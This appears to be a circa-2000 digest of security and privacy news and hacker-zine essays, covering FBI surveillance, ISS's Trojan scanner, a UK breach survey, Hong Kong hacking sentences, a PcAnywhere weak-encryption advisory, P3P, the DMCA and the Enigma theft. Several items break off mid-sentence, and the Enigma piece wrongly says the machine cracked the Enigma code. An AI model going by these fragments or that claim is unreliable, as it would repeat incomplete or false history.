      While corporations -- such as RealNetworks Inc. (Nasdaq: RNWK), 
      DoubleClick (Nasdaq: DCLK), Intel Corp. (Nasdaq: INTC) and Microsoft Corp. 
      (Nasdaq: MSFT) -- have increasingly been taken to task for invading 
      citizens' privacy on the Internet, law enforcement and the government 
      continue to be a major worry for privacy advocates.

      Surveillance on the rise       Domestic surveillance is rising.

      In 1999, police officers searched for individuals in the National Crime 
      Information Center database 2 million times daily, up from the 600,000 
      daily transactions averaged in 1988. Likewise, wiretaps are expected to 
      rise more than 300 percent in the next 10 years, according to the 2001 FBI 
      budget request.

      The trends will only get worse, as technology lowers the barriers that 
      face law enforcement surveillance, said Thomas M. Cecil, a superior court 
      judge for the county of Sacramento, Calif. "In reality, most of what we 
      have is the illusion of openness. Today, we have de facto privacy policy 
      because we are inefficient; probing and gathering are time consuming and 
      expensive. That protects our privacy," he said.

      Jim X. Dempsey, senior staff council for the technology-policy think tank 
      Center for Democracy and Technology and a member of the panel, agreed, 
      adding that more efficient data collection makes a privacy policy that 
      much more critical. "As the technical hurdles are solved, then legal 
      limitations need to be put in place to limit the (invasion of privacy) of 
      citizens," he said.

      While Dempsey said he believed that privacy and citizen safety could 
      coexist, the FBI's George upheld the common wisdom that they cannot.

      "I don't know how (others) can say that there is no price to privacy or 
      price to security in this equation," he said. "In order to prevent crime, 
      information has to be collected ... if justified."

      Everyone a potential suspect?       Yet, without proper regulations about 
      when and how data can be collected, such an assertion makes everyone a 
      suspect, said Jason Catlett, president of privacy information firm 
      Junkbusters Inc., who takes a dim view of current practices.

      "It's like they are saying that we have a lot of robbers, so in order to 
      protect the banks -- rather than make them more secure -- they are 
      requiring the identity of everyone who walks in front of banks."

      The FBI's George realizes where the FBI's push for more surveillance 
      powers puts the agency: "If there is going to be a Big Brother in the 
      United States, it is going to be us -- the FBI," he said.

      The 6th Circuit Appeals Court has overturned a lower court ruling and
      has concluded that the First Amendment does in fact protect computer
      source code. Therefore they have remanded Peter Junger's case over
      encryption exports back to the District Court for further
      consideration.

       (IDG) -- ISS has developed an
       intrusion-detection application,
       code-named Bullet, that lets
       e-commerce companies scan a Web site
       visitor's PC to see if it is infected with
       Trojan horses, such as Back Orifice, or
       viruses that could be passed on to the e-commerce site.

       Trojan horses let intruders seize remote control of PCs, and that could mean a
       compromise of an online banking system, for example, even when the correct
       user identification is employed to access the site. 

       "Businesses are just getting fed up with the crap
       coming off the Internet," says ISS CEO Thomas
       Noonan, adding that one bank is expected to
       announce it is using the ISS application on its
       home banking site this week. 

       The ISS application uses ActiveX technology to scan the laptop, and if required,
       wipe out the unwanted, dangerous code. Noonan acknowledges that use of the
       scanning application could touch off an invasion-of-privacy debate. 

       Further details about the application were not available. ISS has not announced
       when the application will become generally available or how much it will cost.

      British business are too complacent when it comes to online security.
      The Information Security Breaches Survey 2000 (ISBS 2000) found that
      60% of companies have suffered a security breach and that 30% do not
      feel they have anything worth protecting. It was also found that the
      average costs of each intrusion was only 20,000. The study will be

      UK PLC leaves door open to hackers - report

      British companies are too complacent when it comes to Internet security
      and only have themselves to blame if their IT systems are compromised by
      hackers. That's just one of the conclusions of a new survey published by
      the Department of Trade and Industry (DTI) which reveals that two thirds
      of companies in Britain have suffered security breaches within the last 
      two years.
      
      But the survey also reports that most of the losses are under 20,000. 
      This is chicken-feed to mega-corporations, and many of them don't take 
      corrective action even after a loss, possibly because fixing the holes 
      would be more expensive than just accepting continuing small losses. 

      Of those suffering a serious security breach 64 per cent said 
      "nothing has changed" since the trespass occurred.  Just under half
      of all security breaches were due to human error. 

      Malcolm Skinner, Product Marketing manager, AXENT Technologies, said:
      "The report indicates that, to date, businesses have been far too 
      complacent. "In addition to the perils of having your network or Web
      site hacked, companies must think of the consequences as far as customer
      trust is concerned. 

      Tom Perrott, Research director, Taylor Nelson Sofres said: "Although
      there have been some well publicised security breaches, it is generally
      accepted that those brought to the attention of the public are likely 
      to be the tip of the iceberg. 

 
      The key findings of ISBS 2000 show that: 

      + 60 per cent of organisations have suffered a security breach in the
        last two years.
        

      + Over 30 per cent of organisations do not recognise that their business
        information is either sensitive or critical and therefore a business 
        asset worth protecting. 
        
      + 82 per cent of businesses with external electronic links do not use
        any firewall protection, and 59 per cent of those with a Web site do
        not use Web site protection.

      + Of those organisations that have critical or sensitive information,
        63 per cent had suffered a breach that was considered serious to 
        some degree.

      + One in three businesses are either already buying or selling over
        the Internet, or intend to start in the near future.
      
      + Some good practices are implemented and adhered to by 83 per cent 
        of the organisation interviewed - eg. virus protection and password
        controls.

      + Only 37 per cent of organisations interviewed have undertaken a risk
        assessment where a systematic approach is taken to assess the security
        risks faced by the organisation.

      + 40 per cent of companies reporting security breaches were due to 
        operator or user error reinforcing the fact that information security
        cannot simply be solved by technology alone.

      + Nearly three quarters of organisations that suffered a breach, which
        they regarded to be serious, had no contingency plan in place to deal
        with it.

      + More than half of the organisations do not believe that there is 
        anything they could have done to prevent the most serious breaches they
        have suffered.

      + Only one in seven organisations has a formal information management 
        security policy in place.

      + Organisations where responsibility for information security rests at
        board level are those most likely to have formal policies in place. 
        The presence of a formal policy is one of the most important issues 
        in reporting and resolving security breaches.


      The full findings of the DTI's Information Security Breaches Survey 
      2000 (ISBS 2000) will be released at Infosecurity Europe 2000 on 11 
      April at Olympia in London.

      HONG KONG (April 6, 2000 8:02 a.m. EDT http://www.nandotimes.com) - A Hong 
      Kong teenager has been sentenced to six months in jail for hacking into 
      the Internet in the first case of its kind in the territory, a report said 
      Thursday. 

      Po Yiu-ming, 19, was jailed Wednesday, while two of his companions, Tam 
      Hei-lun, 19, and Mak King-lam, 18, were sent to a detention center after 
      pleading guilty to a total of 49 computer crime-related charges, the Hong 
      Kong Standard       reported. 

      It was the first case to be brought before a Hong Kong court after the 
      computer crime laws were enacted in 1994. 

      The trio -- who reportedly got to know each other through surfing the 
      Internet -- exchanged illegally-gained login names and passwords in order 
      to hack into the accounts of Internet subscribers. 

      Magistrate Ian Candy described the three as "intelligent" individuals who 
      could have developed their computer skills for good causes. 

      But Candy said the offenses were serious and they had to be given 
      custodial sentences as a deterrent to others. 

      The trio were released on bail of 10,000 Hong Kong dollars ($1,285) 
      pending appeal. 

      On Wednesday, a system analyst was sentenced to perform 100 hours of 
      community service for unlawfully retrieving tendering data from a 
      government computer system.

      A long time ago (probably 3-4 years) on a computer lab workstation far,
      far away (ok, it was the Midwest) I discovered the Happy Hacker in my
      quest for knowledge of the computer sort.  I found it after sifting
      through search engine results of the keyword 'hacker'.  I had been
      inspired by such movies as "Wargames" and "Sneakers" and realized that
      there was a lot more to this computer thing than Doom and Microsoft Word.
      Having realized this, I dove headfirst into the web, trying to find a
      place that suited my wants and actually had an air of intelligence.
      
      Many of the sites I found were crude and obviously created by
      middle-school-aged kids looking to mess with their friends on AOL.  Two
      things I found caught my attention immediately: Silicon Toad and The Happy
      Hacker mailing list.  I proceeded to download a whole pile of programs
      from Silicon Toad's site, and played with them on my computer at home, but
      beyond that, didn't do too much.  I checked in on it every once in awhile,
      until the site disappeared.  I kept on getting the happy hacker
      newsletter, and found out how to do some neat, trivial things such as
      changing my Windows 95 splash screen for startup and shutdown.
      
      Then I began to read about some of the things that people had done with
      their computers, and against the list founder, Carolyn Meinel.  I didn't
      think too much about this at the time, but kept my interested fascination
      with the whole 'hacker culture' as I progressed with my Computer Science
      degree.  I continued to receive the digest, and towards the end of 1998, I
      got a Happy Hacker digest with a request for a new UNIX editor.  Having
      read most of the info out there about Carolyn Meinel and the general
      consensus about her, I thought about it carefully before I sent in an
      application.  I realized the stigma that currently goes along with CPM and
      the Happy Hacker name, but after consideration, I thought I'd try to keep
      alive the idea that got me into the Happy Hacker in the first place:
      Knowledge and Ethics.  Granted, CPM is currently more interested in money
      and promoting herself than educating and instilling ethics, from what I've
      seen.
      
      I emailed her, and asked if the position was still available.  She asked
      me to write a Guide to (Mostly) Harmless Hacking (GTMHH) on any topic I
      chose.  I chose to write a beginner's guide to C++, since there already
      was one for C.  Well, I sent her a small piece of what I had written, and
      she advised me that Guide submissions are generally much longer.  So I set
      off to flesh it out and expand on the parts she said were somewhat
      lacking.  I got about 2/3 of the way through it, and grad school and work
      took precedence.  A few weeks later, totally to my surprise, I got an
      email from Carolyn asking me if I wanted the position.  I said yes, we
      exchanged our PGP keys, I got the passwords to the unixeditor POP account,
      and I started reading submissions and putting them together to form the
      Happy Hacker UNIX digest.  To see the digests, as they were submitted to
      Carolyn, go to the following URL:
      
      http://fire.gh0st.net/hh/index.html
      
      The first few digests were pretty weak, as most of the questions I got
      were rather bland, and I was still getting the feel of the position.  I
      got very few flames, and a lot of praise.  I realized that I might
      actually be making a difference to some people, trying to help them
      understand the basics (and some details) of UNIX and computer security.
      When I heard that Carolyn had moved the HH mailserver over to an
      AntiOnline computer, I wasn't thrilled, but I really didn't care all that
      much at the moment.  Keydet89, the windows editor, apparently left because
      of this, which was rather sad, because he always had good perl snippets in
      his digests.  (Send me an email keydet, if you wanna tell about your
      experience, or write some articles :)
      
      Then I thought about it.  I looked back at AntiOnline's features section,
      and I thought about JP's article on "Hacker Profiling".  Pieces started to
      fit together.  I thought about the possibility that JP was making copies
      of any mails that I received as a submission and adding them to his pile
      of material to be filtered and info to be added to the 'hacker database'.
      See, a lot of times I'll be sent an email claiming to have broken into a
      site and wanting to know what to do from there.  (Or, someone requests me
      to break into a site for them -- which I'd consider doing, provided you're
      paying me and the site is yours.)  In the second-last HH digest, I
      included a link to my PGP key, and an alternate email address that people
      could write to.  I'd say about half of the respondents used the other
      email address... and 2 or 3 used the PGP key.  I realized that I needed a
      bit more creative freedom, without eyes peeking over my shoulders.
      
      So, I teamed up with some people I had met online, and had been working
      with for a little while, and offered to create a new zine, with an
      emphasis on computers, security, and music.  I wanted to give the people
      that needed a certain amount of mentoring a chance to get some people to
      talk to if they needed help.  I found out that there was a similar group
      of people working on a project similar to the Happy Hacker wargames, but
      cooler, and I started hanging out with them as well.  So, here ends my
      Happy Hacker story.  I know I've left out some minor details, but don't
      worry, they weren't that important.  Let's have a big round of applause
      for the gh0st.net and FireStorm guys!  Hopefully the projects will pick up
      soon, and there will be more to see on both the fire.gh0st.net and
      www.gh0st.net sites.

            *** Onion Routing : Kynik
      ***********************************************************************
      
      While it seems that the term "Onion Routing" may be copyrighted, I feel
      that it is a good description of the technology.  Onion Routing is an
      Internet-based system to prevent eavesdropping and traffic analysis. The
      name "Onion Routing" is appropriate, since it is based upon adding several
      layers of encryption to a message (and removing them) as it is passed
      along the network, as one might remove the layers of an onion.  (I suppose
      one could also call it 'artichoke routing' too ;)  This is essential to a
      network where privacy and anonymity is important.
      
      "Well, so what about privacy, everything I'm sending to that site is
      encrypted with SSL, anyways", you may say.  That's all fine and dandy, but
      chances are, anybody monitoring you knows at least that you've been there,
      since the destination address is plainly readable in the IP header.
      That's where the anonymity portion comes in.  Someone between you and the
      website you're visiting is _not_ able to tell (easily) where you're going,
      or even where you're coming from.  There are two notable systems in
      use/development today (at least what I've initially found).  They are:
      
      Freedom - "Internet Identity Management System"
      http://www.zeroknowledge.com/products/
      
      The Onion Router Project (US Naval Research Lab)
      http://www.onion-router.net/
      
      There are some differences between the two, but I'm not going to analyze
      them.  Now, how does this all work, you ask?  The scheme is built upon
      public-key encryption (of varying strengths) and a 'private' network of
      routers.  Basically, your packet doesn't take the direct route across the
      net like you'd expect it to.  Instead, it is sent to a specialized
      computer which runs the 'onion routing software'.  That 'onion router'
      (OR) hands the packet off to the next designated OR, which continues to
      forward it on, until the last OR designated finally delivers it to the
      true destination.  I don't want to get into the mechanics for establishing
      routes and vendor-specific details like Freedom's Anonymous Mail Proxy,
      but instead I will explain the generic mechanism that allows you to send
      anonymous, private traffic across the internet via onion routing.
      
      A fairly good paper, by Goldschlag, Reed and Syverson, entitled, "Onion
      Routing for Anonymous and Private Internet Connections," does a thorough
      job of explaining this technology:
      
      http://www.onion-router.net/Publications/CACM-1999.pdf
      
      From the paper:
      
        Onion Routing operates by dynamically building anonymous connections
        within a network of real-time Chaum Mixes.  A Mix is a store and forward
        device that accepts a number of fixed-length messages from numerous
        sources, performs cryptographic transformations on the messages, and
        then forwards the messages to the next destination in a random order.
        A single Mix makes tracking of a particular message either by specific
        bit-pattern, size, or ordering with respect to other messages difficult.
        By routing through numerous Mixes in the network, determining who is
        talking to whom becomes even more difficult.  Onion Routing's network of
        core onion-routers (Mixes) is distributed, fault-tolerant, and under
        the control of multiple administrative domains, so no single onion-
        router can bring down the network or compromise a user's privacy, and
        cooperation between compromised onion-routers is thereby confounded.
      
      Freedom's system might be slightly different in implementation, but again,
      I'm ignoring details, and loving every minute of it!  When a specific
      message needs to be sent through the onion-routed network, several layers
      of encryption are placed on the message, along with sufficient information
      to describe the path on a step-by-step basis.  This way, each onion router
      along the way uses its own public key to decrypt the whole 'onion', at
      which point it recognizes the next onion router in the route, and forwards
      the partially-decrypted message to it.  When the enveloped message
      eventually reaches the final onion router, it is decrypted to cleartext,
      and the message is passed to the destination, not too differently from if
      the source host had simply connected in the clear over the Internet,
      except for the fact that it was made virtually untraceable for the
      duration of its trip from end to end.
      
      Feel free to send me questions and commentary on anything I may have
      screwed up (or done well).

            *** The gh0st.net Project (Part 1 of 2): Phatal
      ***********************************************************************
      
        Gh0stnet in its simplest and most basic form is a security model.  As a
      security model, gh0stnet's integrity is maintained by the fact that it
      protects access, whether this be access to data or some other resource
      makes no difference.  Complication occurs when we examine gh0stnet's
      purpose.
      
        The theme is not necessarily to provide an ultra-secure network... it's
      simply to provide security.  Whether the provision of security is done
      well or even in a rational manner is up to us as developers.  Further
      complicating this matter is the concept of providing a security challenge
      or novelty to the public.  Are we targeting a specific group of people to
      benefit from gh0stnet?  As far as I'm concerned, no.  While we are all
      obviously aware that gh0stnet's existence specifically caters to a certain
      type of computer user, there's been no real intention to do so.  By virtue
      of not being funded by a corporation or the government and also by the
      virtue of being conceptualized by someone who spends the better part of
      his day immersed in computer security, the compsec underground will
      inevitably be an integral part of gh0stnet.  Hopefully this will be one of
      its greatest assets.
      
        Although the physical establishment of gh0stnet is still in the works, I
      have a feeling that's going to be the easy part.  I'm putting energy into
      gh0stnet with the intention that it will long surpass my interest.  As a
      field of study and a science, computer security is an evolving subject.
      If gh0stnet is to ever provide anything substantial to its public, it will
      have to reflect this.
      
      Development:
        This is the area that gh0stnet should be the most active in.  If there's
      one thing I hate it's purposeless work.  What I hate more than purposeless
      work is being bored.  From my perspective, I would prefer to do more than
      set up a number of boxes to let people hammer into the ground.  It would
      be fun to look at the logs for a while, but ultimately it would become
      boring.
      
        I'm interested in using gh0stnet as a testbed for alternative,
      ingenuitive, and challenging security concepts.  This would provide tons
      of fun for us, something interesting to give to the users besides boxen to
      break into, and more than likely create some very interesting offspring.
      Software or hardware, it's all a matter of what contributions we as
      individual developers have to offer.
      
      Participation:
        This is an area that I tend to give a lot of thought to. As "developers"
      we really do more than just develop.  We maintain and administer gh0stnet.
      This is not a job. Participation is totally interest-based.  I'm not one
      to force people into doing something that they don't want to.  If it
      appears that the role you're taking in this project is not quite what you
      want or what you expect, it's important that you speak up.  I sacrifice a
      lot of my free time for this but I don't neccessarily expect others to.
      The project does have a well-defined vision/goal that I may be relatively
      inflexible about, but not unapproachable.  What I will be very wary of is
      the inclusion of other individuals outside of my sphere of influence.
      This is a delicate project from my standpoint, so I'm a little touchy as
      to who deals with it.  To have one person on board who doesn't quite see
      the goal or has some other motives besides the prosperity of gh0stnet
      would have a negative impact on the project.  Stating this here serves no
      other purpose than for you folks to be aware that I want a shiny, happy,
      rosey environment in which I deal with people who I know and trust.  Not
      that I don't like contributions, but network management and planning
      should pretty much be kept between us developers.
      
        The most important part of getting this off the ground will be the
      communication that goes on between all of us.  Hopefully most of the
      communication will be occurring on the gh0st.net box, courtesy of TF.
      Toxy has also been threatening to start a mailing list and that sounds
      kick ass to me.  Natas, kp2, and I live in the same state and hopefully
      we'll all be getting drunk together soon ; ).

      [Editor's note: I've taken the liberty to publish this article by Fire
      Storm's founding member in his absence. This article was (and still is)
      available at <http://fire.gh0st.net/vcr.html>. It has not been edited from
      its original form, except for formatting to fit the page, and minor
      spelling corrections.]
      
        To most of the people whom will read this, I have no credibility - why
      should you listen to me?  Well, because if you read any farther, I'm sure
      you will find that I'm not writing about anything extreme; these are our
      rights.
      
        Recently, in retaliation to school violence, people are working to
      suppress information pertaining to explosives; keep it out of the hands of
      youngsters.  Although, this movement is not focusing on just that, rather
      make an exception to our rights, and quiet what we don't want people to
      hear.  You see, this country is based on tolerance.  Some may be
      prejudiced, but we as a whole, in this country, don't just go off destroy
      the minority.  We tolerate it, because if one day our rights are
      threatened, we can count on other people to fight with us.  It's about
      power of people, and not everyone can get what they want - so we must be
      tolerant, even if we don't totally agree with it.
      
        The movement is contradicting itself.  People want to educate the masses
      into an objective whole, yet want to shut out information, and take the
      philosophy, "Ignorance is bliss".  We should work towards happiness,
      because anyone can learn to KILL; bombs, guns, knives, etc. are beside
      the point.  People kill because of many reasons, and "now they can" isn't
      it.
      
        The general public is quick to say that bombs, guns, and "outcasts"  are
      the reason for this school violence problem.  Wrong.  Students don't kill
      just because they _can_, it's because, perhaps they're miserable?  Perhaps
      they're implementing the violence many students just think about?  My
      opinion is yes; I've even tempted to say majority by far think about
      violence as an outlet.
      
        "Wackos" just don't think about violence; everyone does and sometimes we
      actually do what we plan.  I'm not trying to justify what these people do,
      but I'm saying this isn't just some isolated cases.  Something is wrong.
      I personally think it's new presures in society today and the school
      enviroment.  Keep in mind that the basic idea/concept of how school works
      has never changed.  This "concept" isn't education, it's the enviroment,
      which is stressful and obviously causes violence.  You may say something
      to the effect, "Stress is a natural part of life".  I agree with you, but
      these are CHILDREN we're talking about, and they obviously can't cope.
      
        Back on the subject of unalienable rights. If we make an exception,
      we'll find ourselves taking away our own rights, _one_by_one_.  There is
      NO exception, these are our RIGHTS!  There will always be someone you
      disagree with, but you'd better respect THEIR freedom, if you want them to
      respect YOUR freedom.  Because one day, your thoughts may not fit in with
      the majority.
      
      End points:
      
        People in the Untied States of America have the right of press; we can
      write about anything and everything.  If you dont like it, leave. See how
      other goverments deal with these things, and tell me how much you hate
      liberalism.
      
        Leave and go to a country where you can't say jack, and tell me how much
      you'd like to shut up those boisterous protestants.  This issue isn't
      something new.  Censorship itself is an exception we've made, and it's
      wrong.

      ISS is offering an on-line scanner for Web sites which surveys users'

      New Web site security scanner will read your HDD

      Internet Security Systems (ISS), is offering an on-line scanner for Web 
      sites which surveys users hard drives to detect any potentially dangerous 
      programs, such as Trojans and viruses, that may have been placed on the 
      machine without their knowledge. 

      The ISS Online Scanner will automatically test individual computers, 
      identify security weaknesses, and provide users with easy-to- follow 
      instructions for fixing security problems. 

      It looks at the overall configuration of a computer and recommends changes 
      that can help prevent unwanted intruders from reading or changing 
      sensitive personal files or from enabling an attacker to use the computer 
      as a 'zombie' machine to launch more broad-based Internet attacks. 

      "The importance of offering scalable security management solutions to 
      companies that want best-of-breed technology is critical to the success of 
      protecting the Internet economy," ISS Vice President of Enterprise 
      Software Keith Cooley said. 

      "It is imperative that organizations can easily implement the processes 
      and technologies needed to automatically monitor and respond to security 
      risks. As the industrys leading trusted security provider, ISS is 
      strengthening our unique security software platform to ensure safe and 
      uninterrupted e-business for our customers worldwide," he crooned. 

      The ISS application will use Active-X technology to scan a visitor's 
      machine and wipe out any undesirable code. 

      The company acknowledges that use of scanning applications by Web sites 
      could be controversial. But we don't see much of a problem with it. Sites 
      that offer it as a free, voluntary service will do themselves and their 
      customers a favour. 

      Sites foolish enough to require it as a condition of visiting or doing 
      business will find themselves paying a heavy price in gross revenues, as 
      the vast majority of Web surfers are sure to be repelled by it. 'Market 
      forces' should be adequate to keep this a relatively harmless little 
      gimmick.

      Overseas hackers using SingNet accounts to surf 

      

      They are racking up bills for customers by using the global-roaming 
      facility. SingNet devises a counter-strategy

      By STEVE DAWSON

      "MALICIOUS hackers" from overseas have been racking up surfing bills for 
      unsuspecting SingNet customers by using their Internet accounts, The 
      Straits Times has found out. 

      The hackers, many of whom have been traced to Thailand, take advantage of 
      a facility called global roaming, provided by SingNet. 

      The facility allows users who travel overseas to call up a service 
      provider there to connect to SingNet, so they save on IDD charges. 

      The number of complaints from customers who said their accounts have been 
      used by other people peaked at around 50 a month in November and December, 
      said SingNet's product development manager, Mr Lee Wan Fei. 

      SingNet, which has a 260,000 customer-base, sees the cases as fraud and 
      have referred them to the police. 

      Most cases seem to involve students, who use chatrooms or 
      instant-messaging services regularly. 

      Here, passwords can either be detected through Trojan-horse viruses 
      installed on the hard drive through files sent via e-mail or lapses in 
      personal security, like giving your password to other people. 

      Overseas surfers who obtain passwords fraudulently are then able to log on 
      to the Net using an account belonging to a SingNet customer. 

      This unauthorised use raises the customer's bill. SingNet declined to say 
      how much money was involved. 

      Contractually, SingNet's customers are responsible for all usage on their 
      accounts. But Mr Lee said: "On a case-by-case basis, with adequate proof 
      provided by the user, we may consider offsetting part of the bill for 
      them." 

      SingNet has launched a two-pronged counterattack. It will, from Tuesday, 
      allow users to disable the global-roaming service, which, at present,

      Computer hacker jailed for six months       ELAINE PAK LI 

      
      --------------------------------------------------------------------------
      ------ A shy teenager who became a computer hacker to find "satisfaction 
      and achievement" was jailed for six months yesterday. Clerk Po Yiu-ming, 
      19, who was among the first three hackers to be convicted since computer 
      crime-related laws were enacted in 1994, turned to crime because he was a 
      social outcast, a court heard. 

      Restaurant manager Tam Hei-lun, 19, and student Mak King-ming, 18, were 
      both sentenced to a detention centre for similar offences. 

      The trio, who had earlier pleaded guilty to a total of 49 computer 
      crime-related charges, appeared before Eastern Court magistrate Ian Candy 
      yesterday. 

      Po's lawyer, Wong Man-kit, said the clerk suffered asthma and a skin 
      disease, which had isolated him from classmates. 

      Gradually he became an introvert with low self-esteem. 

      "He then became interested in computers and was obsessed . . . He got a 
      sense of achievement and satisfaction from such offences," Mr Wong said. 

      Barrister Thomas Chan, for Tam, suggested a community service order so the 
      restaurant manager could be punished and rehabilitated at the same time. 

      Tse Hon-yuen for Mak, said the student, who was sitting his A-levels, was 
      now "aware of the responsibility of his foolish act". 

      But Mr Candy, who described the three first offenders as "talented and 
      highly intelligent in computer skills", said they had caused "great damage 
      and loss to society and the economy". 

      "Each of you are well aware that the things you do are dishonest and 
      wrong. Your offences have even alarmed legitimate Internet users. 

      "The court must give a clear message that these offences must be given a 
      deterrent sentence. 

      "Even though each of you have clear criminal records, come from good 
      families and are in every other way talented, the only sentence to impose 
      is an immediate custodial term," Mr Candy said. 

      The court has heard Po had illegally obtained 127 login names and 
      passwords, given to Internet users when they subscribe to a service 
      provider for a monthly fee and an hourly rate. 

      The trio got know each other through the Internet and exchanged the login 
      names and passwords and hacked into a number of user accounts. 

      Mak had also downloaded songs from the Internet and sold them on discs 
      without the publishers' authorisation, the court had heard. 

      Tam wept as he was sentenced while the other two remained expressionless. 

      The trio applied for bail pending appeal and were released on $10,000 
      bail. 

      Detective Senior Inspector Fung Wai-keung of the Computer Crime Bureau, 
      who was in charge of the case, described the sentences as "appropriate." 

      "Illegally obtaining login names and passwords and selling them for profit 
      is just one of many computer related crimes," he said. 

      "The precedent set today is a good example to show to the international 
      community that Hong Kong will never allow such crimes in the information 
      technology field. 

      "We are not going to let such crimes affect the local electronic trade and 
      its reputation," Inspector Fung added.

      PcAnywhere weak password encryption Posted to BugTraq on 7.4.2000

      PcAnywhere 9.0.0 set to its default security value uses a trivial 
      encryption method so user names and password are not sent directly in 
      clear. Since most users have the encryption methods set to either "none" 
      or "PcAnyWhere", their password are sent with weak encryption. 

      A major concern lies in the fact that PcAnywhere can authenticate users 
      based on their NT domain accounts and passwords. When the user logs on, it 
      is prompted for its NT username and password. They are then "encrypted" 
      through the PcAnywhere method and decrypted by the host computer for 
      validation by the NT domain controller. Someone snooping on the traffic 
      between the two stations will unlock both the PcAnywhere and NT account. 
      All that without even having to go through the L0phtCrack process. 

      Version 7.0 is not at risk since no encryption is used at all. Username 
      and password are sent in clear. I haven't tested version 8 yet.

      --- Solution ---       Symantec says that this was not intended to be real 
      encryption and suggest the use of the Public or Symetric key option 
      instead. More info can be found at :

      Microsoft promised free Internet tools based on emerging privacy
      standards for controlling how much information people using the Web
      reveal.

      Microsoft plans free Net privacy tools By The Associated Press Special to 
      CNET News.com April 7, 2000, 4:50 a.m. PT TORONTO--Microsoft promised free 
      Internet tools based on emerging privacy standards for controlling how 
      much information people using the Web reveal. 

      Coming from the world's largest software company, the tools could give 
      impetus for Web sites and other companies to embrace the Platform for 
      Privacy Practices, or P3P. The World Wide Web Consortium, an Internet 
      standards group, may finalize P3P this summer. 

       
      Richard Purcell, Microsoft's chief privacy officer, said the tools will 
      help consumers better understand how sites track visits and pass along 
      information to other parties. 

      A formal announcement is expected in a few weeks. Purcell disclosed the 
      company's intent during an interview yesterday at the Computers, Freedom 
      and Privacy conference here, meeting through today. 

      People using the Internet are increasingly concerned about Web sites that 
      create profiles of email addresses, favorite books and clothing sizes for 
      marketing purposes. 

      Sites often disclose their intent in privacy statements that are difficult 
      to find and understand. The Microsoft tools, to be released this fall, 
      will translate such statements into machine-readable form and let Internet 
      surfers block access to sites that collect too much. 

      With the software, people using the Web can state what types of 
      information they are willing to give, as well as whether they mind sharing 
      that information with outside parties. Internet surfers will receive a 
      warning before visiting sites that go beyond that level. 

      Microsoft plans to make the tools for its browser, Internet Explorer, and 
      for the competing Netscape browsers. 

      Lorrie Cranor, who heads a P3P  

      Lorrie Cranor, chair of the P3P specification working group at the W3C, 
      discusses the proposed privacy standard.  

      working group, considered Microsoft's decision important, saying, "In 
      order for P3P to be widely used, there has to be good user software 
      available.

      "The question I always get is, 'Is Microsoft going to implement it?'" she 
      said. 

      Still, critics believe Web sites won't have incentives to join, rendering 
      such tools and standards meaningless. Jason Catlett, president of 
      Junkbusters and a critic of P3P, said wide adoption remains years away.

      Cisco plans firewall addition for small businesses
      
      By Cathleen Moore 

      CISCO SYSTEMS NEXT week plans to ramp up its VPN (virtual private network) 
      security with a new addition to its PIX firewall line as well as an 
      updated version of its Secure Policy Manager software for enterprise 
      users. 

      The Cisco PIX Firewall 506 will bring a low-end offering aimed at small 
      businesses and branch offices to the company's existing firewall set. 
      Other products in the family include the PIX 515, targeted at small and 
      midsize enterprises, and the Secure PIX 520, which is designed for large 
      enterprise installations.

      With its newest firewall member, Cisco is attempting to tap into small 
      business environments, which -- with increasing reliance on the Internet 
      -- are seeking more powerful security solutions for remote access 
      technologies and VPN. About the size of a hardback, the PIX 506 can handle 
      throughput of 10Mbps and 3DES encryption at rates of 4Mbps, according to 
      Cisco. The 506 firewall holds a 200MHz Intel Pentium III processor, 32MB 
      of RAM, and two integrated Fast Ethernet ports. 

      Version 2.0 of Cisco Secure Policy Manager adds improved scalability and 
      additional support for IPsec VPN configurations in Cisco's routers and 
      firewalls. The Policy Manager lets IT managers define and audit network 
      security policies from a central location, according to the company. The 
      product also can simplify deployment of security services supported by 
      Cisco's firewalls and IOS-based VPN routers, Cisco said.

      The Cisco Secure PIX Firewall 506 will be available in May, priced 
      starting at $1,950. The Secure Policy Manager 2.0 will begin shipping this 
      month, priced at $7,500.

            Getting Snooped On? Too Bad by Declan McCullagh 3:00 a.m. Apr. 7, 
            2000 PDT TORONTO -- You say you don't like browser cookies? You're 
            not quite sure if that program you download from the Net is 
            revealing more about you than it should? 

      Well, here's something to make you really nervous: In the United States, 
      it may be illegal to disable software that snoops on you. 

      The folks who came up with this idea turn out to be the large corporations 
      that helped to draft the Digital Millennium Copyright Act (DMCA), which 
      restricts some forms of tampering with copyright protection devices. 

      In some cases, that means you won't be able to turn off any surveillance 
      features it might include, according to participants in a Thursday 
      afternoon panel at the Computers, Freedom and Privacy conference. 

      "Privacy circumvention is possible only under a limited circumstance," 
      said Paul Schwartz of the Brooklyn Law School. 

      As more and more copyrighted material makes its way online, content owners 
      are turning to encryption to protect their works from widespread illicit 
      redistribution. 

      Stephen King distributed his recent novel online in encrypted form, and 
      music companies are backing Secure Digital Memory Card for audio players. 

      Privacy advocates fret that if future works are secure and thus protected 
      under the DMCA, they could reveal consumers' private behavior 
      --RealNetworks' RealJukebox player secretly did just that -- and tinkering 
      with the program to turn off the reporting mechanism would be illegal. 

      "The practical impact is it's another area we're going to be fighting 
      about," Schwartz said. 

      The DMCA, which became law in October 1998, does allow some very limited 
      forms of privacy circumvention. You're allowed to do it if the software 
      leaks "personally identifying information" about you without giving you 
      the ability to say no, and if you're not "in violation of any other law." 

      But here's the rub: Many, if not most, programs include shrink-wrap 
      licenses that prohibit reverse-engineering or altering the program. 

      Some courts have said that shrink-wrap licenses -- software license 
      agreements that don't require a signature -- are binding. If you violate 
      them, would you be able to take advantage of the DMCA's 
      privacy-circumvention loophole? 

      The answer may well be yes. "The statute is basically totally incoherent," 
      says Pam Samuelson, a professor at the University of California at 
      Berkeley and an influential copyright scholar. 

      "We're getting tortured by laws that are inherently incoherent," 
      complained Barry Steinhardt, associate director of the ACLU. 

      Violating the DMCA is a civil offense, and "willfully" violating it for 
      private financial gain is a criminal offense punishable by five years in 
      jail and a $500,000 fine.

      machine theft

      

      Bletchley Park: Centre for wartime code-breaking effort

      A 50-year-old man has been released on police bail after being questioned 
      by detectives investigating the disappearance of the Enigma encoding 
      machine.       The man, from Bedfordshire, was arrested on Tuesday and 
      released after questioning at Milton Keynes police station. 

      Police have mounted a massive search for the historic machine, which 
      cracked the Nazi Enigma code during the Second World War. 

      It was stolen in broad daylight from a glass cabinet at the Bletchley Park 
      museum on Saturday, where it was on display. 

      Police officers were preparing to trawl a lake on the estate and search 
      the mansion. 

      Thames Valley Police spokesman John Brett said: "A search of the mansion 
      and the grounds of Bletchley Park will start under the supervision of a 
      police search adviser and a team of 10 police officers. 

      
